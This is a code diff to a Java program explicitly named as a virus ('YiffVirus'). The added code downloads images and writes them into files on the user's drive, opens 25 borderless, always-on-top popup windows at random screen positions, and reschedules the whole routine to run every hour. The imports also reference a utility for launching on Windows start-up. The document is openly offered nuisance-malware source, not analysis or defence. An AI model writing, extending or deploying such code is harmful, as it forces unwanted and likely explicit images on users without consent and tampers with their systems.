@@ -8,13 +8,21 @@ import me.bannock.virus.images.impl.TestImageProviderService;
 import me.bannock.virus.utils.StartOnWindowsStartUtil;
 import me.bannock.virus.utils.WindowsUtils;
 
+import javax.imageio.ImageIO;
+import javax.swing.ImageIcon;
 import javax.swing.JFrame;
+import javax.swing.JLabel;
 import java.awt.HeadlessException;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
 import java.nio.file.Files;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Timer;
+import java.util.TimerTask;
 
 public class YiffVirus extends JFrame implements Runnable {
 
@@ -113,7 +121,8 @@ public class YiffVirus extends JFrame implements Runnable {
                     if (config.shouldScatterAcrossDrive()){
                         // TODO: Scatter across drive if enabled in the config
                     }
-                    System.out.println(imageFile.getAbsolutePath());
+                    if (imageFile.exists())
+                        continue; // We don't want to accidentally write over another file
 
                     // Write the image to the file
                     Files.write(imageFile.toPath(), getImageProviderService().fetchBytes(url));
@@ -127,12 +136,55 @@ public class YiffVirus extends JFrame implements Runnable {
         // TODO: Set default user icon
         // C:\ProgramData\Microsoft\User Account Pictures
 
+        // TODO: Set folder icons
+
+        // Takes images from the provider and opens them in many window popups
+        if (config.shouldPopupImages()){
+            List<String> images = getImageProviderService().fetchImages(25);
+            new Thread(() -> {
+                for (String url : images){
+
+                    // Loads image
+                    byte[] bytes = getImageProviderService().fetchBytes(url);
+                    try (InputStream in = new ByteArrayInputStream(bytes)) {
+                        BufferedImage image = ImageIO.read(in);
+
+                        // Creates popup window
+                        JFrame popup = new JFrame();
+                        popup.setSize(image.getWidth(), image.getHeight());
+                        popup.setUndecorated(true);
+                        popup.setAlwaysOnTop(true);
+                        popup.setResizable(false);
+                        JLabel imageLabel = new JLabel();
+                        imageLabel.setIcon(new ImageIcon(image));
+                        popup.setContentPane(imageLabel);
+                        popup.setDefaultCloseOperation(DISPOSE_ON_CLOSE);
+                        popup.setTitle(Long.toString(System.nanoTime(), Character.MAX_RADIX));
+
+                        // Gets the size of the screen
+                        int screenWidth = (int) java.awt.Toolkit.getDefaultToolkit().getScreenSize().getWidth();
+                        // Set the position of the window to a random point on screen, handles window size to not go off screen
+                        popup.setLocation((int) (Math.random() * (screenWidth - popup.getWidth())),
+                                (int) (Math.random() * (java.awt.Toolkit.getDefaultToolkit().getScreenSize().getHeight()
+                                        - popup.getHeight())));
+                        // Show the window
+                        popup.setVisible(true);
+                    } catch (IOException ignored) {}
+                }
+            }).start();
+        }
+
+
         // Repeated hourly if wanted
-        if (config.shouldRunHourly())
-            try{
-                Thread.sleep(1000 * 60 * 60);
-                run();
-            }catch (Exception ignored){}
+        if (config.shouldRunHourly()){
+            final Runnable goober = this;
+            new Timer().schedule(new TimerTask() {
+                @Override
+                public void run() {
+                    goober.run();
+                }
+            }, 1000 * 60 * 60);
+        }
     }
 
     public void setConfig(Config config) {
